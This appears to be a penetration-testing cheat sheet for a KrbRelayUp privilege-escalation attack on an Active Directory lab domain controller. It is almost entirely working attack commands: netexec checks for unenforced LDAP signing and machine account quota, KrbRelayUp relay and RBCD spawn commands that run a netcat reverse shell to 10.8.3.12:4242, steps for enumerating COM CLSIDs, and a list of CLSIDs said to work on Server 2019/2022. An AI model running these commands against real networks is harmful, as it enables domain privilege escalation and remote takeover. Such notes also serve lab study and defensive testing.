- Tool :

- Check if exploitable : 
```sh
netexec ldap brunodc.bruno.vl -u "svc_scan" -p "Sunshine1" -M ldap-checker
# LDAP Signing NOT Enforced!

netexec ldap brunodc.bruno.vl -u "svc_scan" -p "Sunshine1" -M maq
#MachineAccountQuota: 10
```

- Exploit with a tool : 
```powershell
.\KrbRelayUp.exe relay brunodc.bruno.vl -CreateNewComputerAccount -ComputerName pwned$ -ComputerPassword P@ssword1234 -cls <CLS>
```

```powershell
./KrbRelayUp spawn -m rbcd --DomainController brunodc.bruno.vl -cn pwned$ -cp P@ssword1234 --sc "C:\Users\svc_scan\Documents\nc.exe 10.8.3.12 4242 -e cmd"
```

- Find a CLSID for a specific OS (as admin on a comparable machine to your target):
https://github.com/tyranid/oleviewdotnet
```sh
Import-Module .\OleViewDotNet.psd1
Get-ComDatabase -SetCurrent
$comdb = Get-CurrentComDatabase
$clsids = (Get-ComClass).clsid

Get-ComProcess -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll' 
```

**CLSIDs** (confirmed working on Server 2019/2022 with ADCS installed):

- c980e4c2-c178-4572-935d-a8a429884806
- 90f18417-f0f1-484e-9d3c-59dceee5dbd8
- 03ca98d6-ff5d-49b8-abc6-03dd84127020
- d99e6e73-fc88-11d0-b498-00a0c90312f3 (certsrv.exe)
- 42cbfaa7-a4a7-47bb-b422-bd10e9d02700
- 000c101c-0000-0000-c000-000000000046
- 1b48339c-d15e-45f3-ad55-a851cb66be6b
- 49e6370b-ab71-40ab-92f4-b009593e4518
- 50d185b9-fff3-4656-92c7-e4018da4361d
- 3c6859ce-230b-48a4-be6c-932c0c202048 (trusted installer service)


- Ressource: 
https://vulndev.io/cheats-windows/
